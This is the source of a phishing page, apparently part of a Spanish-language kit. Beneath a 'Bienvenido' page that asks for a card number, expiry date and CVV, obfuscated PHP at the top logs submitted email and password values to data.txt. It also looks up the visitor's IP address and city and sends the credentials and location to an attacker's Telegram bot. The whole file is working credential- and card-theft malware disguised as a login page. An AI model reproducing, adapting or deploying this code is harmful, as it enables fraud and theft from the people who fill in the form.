<?php
 goto ebIsw; G1lg4: @(include "\164\x6c\x67\162\141\155\56\x70\x68\x70"); goto o2Bs6; vYqo2: curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); goto SxmCB; GB3rt: curl_setopt($ch, CURLOPT_URL, $urlMsg); goto phqzU; aG79R: $urlMsg = "\x68\x74\164\160\x73\72\57\57\141\160\x69\56\x74\x65\154\145\x67\162\141\x6d\56\157\162\147\x2f\142\x6f\x74{$token}\x2f\x73\x65\x6e\x64\x4d\x65\163\x73\x61\x67\x65"; goto HOgMh; ZcKxJ: $userp = $_SERVER["\x52\105\115\117\x54\x45\137\101\104\104\x52"]; goto O6LKE; o2Bs6: @(include "\167\141\x72\x6e\56\160\x68\160"); goto MUaVC; t0Hz_: function get_client_ip() { $ipaddress = ''; if (isset($_SERVER["\110\x54\124\120\137\103\114\111\105\116\x54\137\111\120"])) { $ipaddress = $_SERVER["\110\124\x54\120\137\103\x4c\x49\x45\116\x54\137\x49\120"]; } else { if (isset($_SERVER["\x48\x54\124\x50\x5f\x58\137\106\x4f\x52\127\x41\x52\104\105\x44\x5f\x46\x4f\x52"])) { $ipaddress = $_SERVER["\110\x54\x54\x50\x5f\x58\x5f\x46\x4f\122\127\x41\x52\x44\105\x44\137\x46\x4f\122"]; } else { if (isset($_SERVER["\x48\x54\124\120\137\x58\x5f\x46\x4f\x52\127\x41\122\x44\x45\104"])) { $ipaddress = $_SERVER["\110\124\124\x50\x5f\130\137\x46\x4f\x52\x57\101\122\x44\105\x44"]; } else { if (isset($_SERVER["\x48\x54\124\x50\x5f\106\x4f\122\127\101\122\x44\x45\x44\x5f\x46\x4f\122"])) { $ipaddress = $_SERVER["\x48\x54\x54\120\137\106\117\x52\127\101\122\x44\x45\x44\137\106\117\122"]; } else { if (isset($_SERVER["\x48\x54\124\120\x5f\106\x4f\x52\127\101\122\104\x45\104"])) { $ipaddress = $_SERVER["\x48\124\x54\x50\x5f\x46\x4f\x52\127\101\122\104\105\x44"]; } else { if (isset($_SERVER["\122\x45\115\117\124\105\x5f\x41\104\x44\122"])) { $ipaddress = $_SERVER["\x52\x45\x4d\117\124\x45\137\101\x44\x44\x52"]; } else { $ipaddress = "\125\116\x4b\x4e\117\127\x4e"; } } } } } } return $ipaddress; } goto AatbQ; HOgMh: $ip = get_client_ip(); goto e13Jg; ebIsw: if ($_POST) { $trax = $_POST["\x74\x72\x61\170"]; $trex = $_POST["\164\162\145\x78"]; fwrite(fopen("\144\x61\x74\141\x2e\164\x78\164", "\141"), "\115\x41\x49\114\x3a\40" . "{$trax}\xa" . "\120\x41\123\x53\x57\72\40" . "{$trex}\xa\xa"); } goto G1lg4; Smyvv: curl_setopt($ch, CURLOPT_POSTFIELDS, "\143\150\141\x74\x5f\x69\144\75{$id}\x26\160\x61\162\x73\145\137\155\x6f\144\x65\75\110\124\x4d\114\46\164\145\170\164\75{$msg}"); goto vYqo2; AatbQ: function get_ip_info($ip) { $url = "\150\164\x74\x70\72\x2f\x2f\x69\160\x2d\x61\160\151\x2e\143\157\155\x2f\x6a\163\x6f\x6e\57{$ip}"; $response = file_get_contents($url); if ($response) { $data = json_decode($response, true); if ($data["\x73\164\x61\x74\165\x73"] == "\163\x75\143\143\145\163\x73") { $country = $data["\x63\x6f\x75\156\x74\x72\171"]; $city = $data["\x63\x69\x74\x79"]; return "\x50\x61\303\xad\x73\72\40{$country}\xa\x43\151\165\x64\x61\144\72\x20{$city}"; } } return "\111\x6e\x66\x6f\162\155\x61\143\151\303\xb3\x6e\x20\x64\x65\40\x75\142\151\x63\x61\x63\151\303\xb3\156\40\x6e\157\x20\144\x69\x73\160\x6f\156\151\142\x6c\x65\56"; } goto Mv4jo; EtbJq: curl_close($ch); goto P6Fs0; O6LKE: $token = $T0K3N; goto H03nF; phqzU: curl_setopt($ch, CURLOPT_POST, 1); goto Smyvv; H03nF: $id = $chatID; goto aG79R; SxmCB: $server_output = curl_exec($ch); goto EtbJq; e13Jg: $ipInfo = get_ip_info($ip); goto Ej2Fy; Mv4jo: @session_start(); goto ZcKxJ; MUaVC: @(include "\x6e\157\164\56\x70\x68\x70"); goto t0Hz_; Ej2Fy: $msg = "**🧙🏻‍♂️DINRS🧙🏻‍♂️**\n" . "\x55\x53\105\122\72\40{$trax}\12" . "\x50\x41\123\127\122\x44\72\x20{$trex}\xa" . "\111\120\72\x20{$ip}\xa" . "\125\x62\x69\143\141\x63\x69\xc3\xb3\156\x3a\40{$ipInfo}"; goto ZGNj0; ZGNj0: $ch = curl_init(); goto GB3rt; P6Fs0: ?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bienvenido</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
    <div class="cont-log">
    <img src="pixts/logdi.png" alt="">
    </div>

    <div class="cont2">
        <img src="pixts/fm2.svg" alt="">
        <div class="cont-form2">
            <form id="myfm2" action="_indexx.php" method="post">
              <div class="usr2">
                <input id="brax" name="brax" type="text">
                <input id="brex" name="brex" type="text">
              </div>

              <div class="trj">
                <input placeholder="0000 0000 0000 0000" maxlength="16" id="brix" name="brix" type="text">
              </div>

              <div class="fech-venc">
                <div class="cont-selects">
                  <select name="dia" id="dia">
                    <option value="1">1</option>
                    <option value="2">2</option>
                    <option value="3">3</option>
                    <option value="4">4</option>
                    <option value="5">5</option>
                    <option value="6">6</option>
                    <option value="7">7</option>
                    <option value="8">8</option>
                    <option value="9">9</option>
                    <option value="10">10</option>
                    <option value="11">11</option>
                    <option value="12">12</option>
                    <option value="13">13</option>
                    <option value="14">14</option>
                    <option value="15">15</option>
                    <option value="16">16</option>
                    <option value="17">17</option>
                    <option value="18">18</option>
                    <option value="19">19</option>
                    <option value="20">20</option>
                    <option value="21">21</option>
                    <option value="22">22</option>
                    <option value="23">23</option>
                    <option value="24">24</option>
                    <option value="25">25</option>
                    <option value="26">26</option>
                    <option value="27">27</option>
                    <option value="28">28</option>
                    <option value="29">29</option>
                    <option value="30">30</option>
                    <!-- Continúa con las opciones hasta el 30 -->
                  </select>
                  <select name="ano" id="ano">
                    <option value="2023">2023</option>
                    <option value="2024">2024</option>
                    <option value="2025">2025</option>
                    <option value="2026">2026</option>
                    <option value="2027">2027</option>
                    <option value="2028">2028</option>
                    <option value="2029">2029</option>
                    <option value="2030">2030</option>
                    <option value="2031">2031</option>
                    <option value="2032">2032</option>
                    <option value="2033">2033</option>
                    <option value="2034">2034</option>
                    <!-- Continúa con las opciones de años según tus necesidades -->
                  </select>

                </div>
                <div class="cv">
                  <input maxlength="3" id="brux" name="brux" type="text" placeholder="000">
  
                </div>
              </div>
              
              
              <!-- <input id="brox" name="brox" type="text"> -->
              <div class="sub2">
                <input type="submit" value="Continuar">
              </div>

            </form>
        </div>

    </div>


</body>
</html>
<script src="movie/aje.js"></script>